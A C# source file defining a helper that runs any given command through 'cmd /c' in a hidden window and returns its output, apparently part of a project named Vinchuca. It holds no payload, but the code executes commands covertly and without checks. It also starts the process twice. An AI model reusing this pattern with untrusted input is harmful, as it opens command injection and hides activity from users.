using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace Vinchuca.System
{
    static class WinShell
    {
        public static string Execute(string command)
        {
            var output = string.Empty;

            try
            {
                var startInfo = new ProcessStartInfo("cmd", "/c " + command)
                {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    CreateNoWindow = true,
                };

                using (var process = Process.Start(startInfo))
                {
                    process.OutputDataReceived += (sender, e) => output += Environment.NewLine + e.Data;
                    process.EnableRaisingEvents = true;
                    process.BeginOutputReadLine();
                    process.Start();
                    process.WaitForExit(5 * 1000);
                }
            }
            catch (Exception e)
            {
                output = e.ToString();
            }
            return output;
        }
    }
}
